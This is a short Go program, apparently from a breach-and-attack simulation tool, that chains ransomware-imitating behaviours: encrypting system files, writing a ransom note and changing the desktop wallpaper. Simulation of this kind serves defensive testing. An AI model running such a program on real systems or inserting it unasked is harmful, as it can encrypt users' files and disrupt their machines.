package main

import (
	"context"

	"github.com/FourCoreLabs/firedrill/pkg/behaviours/ransom_note"
	"github.com/FourCoreLabs/firedrill/pkg/behaviours/ransom_sysencrypt"
	"github.com/FourCoreLabs/firedrill/pkg/behaviours/ransom_wallpaper"
	"github.com/FourCoreLabs/firedrill/pkg/sergeant"
	"go.uber.org/zap"
)

var (
	version string = "0.1"
)

func main() {
	logger, _ := zap.NewProduction()

	behaviours := []sergeant.Runnable{
		ransom_sysencrypt.NewRansomEncrypt(),
		ransom_note.NewRansomNote(),
		ransom_wallpaper.NewRansomWallpaper(),
	}

	sergeant := sergeant.NewSergeant(logger, behaviours...)
	if err := sergeant.Start(context.Background()); err != nil {
		logger.Sugar().Fatalw("execution failed", "error", err.Error())

	}
}
